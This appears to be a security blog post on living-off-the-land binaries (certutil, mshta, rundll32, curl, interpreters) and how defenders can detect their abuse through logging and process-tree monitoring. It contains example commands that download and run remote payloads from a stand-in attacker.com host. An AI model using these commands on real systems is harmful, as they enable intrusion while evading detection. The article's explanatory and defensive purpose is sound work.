---
title: "Living Off the Land - Why LOLBins Are a Defender's Nightmare"
date: 2025-09-10
categories:
  - Case Studies
  - Security Research

tags: [Threat Research, LOLBins, LOLBAS, Defense Evasion, Red Team, Blue Team]
description: "A breakdown of living-off-the-land techniques — why they work, what they look like in the wild, and how defenders can approach detection when the attacker's weapon is your own OS."
---

One of the more uncomfortable truths in offensive security is that some of the most effective attack techniques don't require any malware at all. No payload, no custom binary, nothing that a traditional AV solution would flag. Just the operating system's own legitimate tools, doing things they were designed to do — pointed in the wrong direction.

This is the core idea behind living-off-the-land (LOTL) techniques, and understanding them is increasingly important whether you're on the offensive or defensive side of a network.

## What Are LOLBins?

LOLBins — Living Off the Land Binaries — are legitimate system executables that can be abused by attackers to perform malicious actions while avoiding detection. The term is documented extensively in the [LOLBAS project](https://lolbas-project.github.io/) for Windows and [GTFOBins](https://gtfobins.github.io/) for Linux/Unix systems.

The reason they're effective is structural: security tooling is built around the concept of distinguishing malicious from benign. A custom reverse shell binary is a clear signal. `certutil.exe` downloading a file from the internet is harder to call — because `certutil.exe` is supposed to exist, and it legitimately needs to communicate over the network in some configurations.

## A Few That Show Up Constantly

### certutil.exe (Windows)

Certutil is a Windows command-line tool for certificate management. It also happens to be able to download arbitrary files from the internet and decode base64 content — capabilities that exist for legitimate reasons, and which attackers have been abusing for years.

```cmd
certutil.exe -urlcache -split -f http://attacker.com/payload.exe payload.exe
certutil.exe -decode encoded.b64 payload.exe
```

It shows up so frequently in malware campaigns that it's practically a signature at this point — which means defenders watch for it, which means more sophisticated operators have largely moved on to less-watched alternatives. But it still appears in opportunistic attacks and commodity malware regularly.

### mshta.exe

Microsoft HTML Application Host — a legitimate Windows binary for running `.hta` files. Commonly used in phishing campaigns because it can execute VBScript or JScript directly from a remote URL:

```cmd
mshta.exe http://attacker.com/payload.hta
```

The payload never touches disk in the traditional sense. Execution happens through a signed Microsoft binary. Many older AV solutions won't flag it.

### rundll32.exe

Designed to execute DLL files. Can be used to load and execute arbitrary code, call exported functions from DLLs, and in some configurations execute JavaScript:

```cmd
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://attacker.com/payload.sct")
```

### curl / wget (Linux)

These are so standard they almost don't feel like LOLBins, but they're worth mentioning in context: on a compromised Linux host, `curl` and `wget` are the most common tools for staging additional payloads and exfiltrating data because they're almost universally present and their traffic blends with normal application behavior. The HTB Curling machine I wrote up on this blog actually features `curl` abuse at the privilege escalation stage — a root-owned cron job with a user-controllable URL parameter.

### python3 / perl / bash

Script interpreters present on virtually every Linux system are powerful LOTL primitives for reverse shells, data staging, and persistence. The classic Python shell stabilization technique (`python3 -c 'import pty; pty.spawn("/bin/bash")'`) that every CTF player knows is just one small example of a much broader surface.

## Why This Makes Detection Hard

The detection challenge isn't identifying that `certutil.exe` ran — it's identifying whether the specific invocation of `certutil.exe` was legitimate or malicious. This requires behavioral context that signature-based detection doesn't provide:

- What process spawned it?
- What was the parent process?
- What was the network destination?
- Is this consistent with the user's normal behavior?
- Does this host normally run certutil at all?

This is why the security industry has been moving toward behavioral detection — EDR solutions that track process trees, network activity, and file system operations together rather than scanning for known-bad signatures. But behavioral detection generates noise, requires tuning, and is only as good as the baseline you establish.

## The Attacker's Perspective

From an offensive standpoint, LOTL techniques are valuable because they reduce the operational surface that defensive tooling can detect. If you're operating in an environment with mature endpoint security, the question isn't "what payload gets past the AV" — it's "what can I do using only things that are already here."

This shifts the mental model from *bring your tools* to *understand the environment's tools*. A Windows environment always has PowerShell. It usually has certutil, mshta, wmic. It has the .NET runtime. A Linux environment has Python, bash, curl, and whatever's installed for the application stack. Working through what each of these can do — and mapping that to the MITRE ATT&CK technique catalog — is a useful exercise in understanding both offensive capability and defensive visibility.

## What Defenders Can Actually Do

**Log what you have.** The most underutilized defense against LOTL is command-line logging. Windows Event ID 4688 with command-line auditing enabled, or PowerShell ScriptBlock Logging, gives you visibility into what's actually being executed. Without it, you're flying blind.

**Know your baseline.** Behavioral detection only works if you know what normal looks like. `certutil.exe` running on a developer's workstation might be routine. `certutil.exe` running on a file server that's never needed certificate management is worth a look.

**Monitor for unusual parent-child process relationships.** `Word.exe` spawning `powershell.exe` is a well-known phishing indicator. `IIS worker process` spawning `cmd.exe` is worth investigating. Process tree anomalies are often more reliable signals than specific tool invocations.

**Use LOLBAS and GTFOBins offensively-informed defensively.** Go through the LOLBAS catalog and ask: which of these binaries exist in my environment? Which ones have network capabilities I'm not monitoring? This is exactly the kind of threat-informed defense work that closes gaps before they're exploited.

## The Bottom Line

Living-off-the-land isn't a new concept, but it's increasingly the default approach for anything beyond commodity malware. Understanding the technique class — not just individual tools, but the underlying principle that legitimate system utilities can be repurposed — is foundational for anyone working on either side of a network.

The operating system is always present. The question is who knows how to use it.

---

*Resources: [LOLBAS Project](https://lolbas-project.github.io/) · [GTFOBins](https://gtfobins.github.io/) · [MITRE ATT&CK — Defense Evasion](https://attack.mitre.org/tactics/TA0005/)*
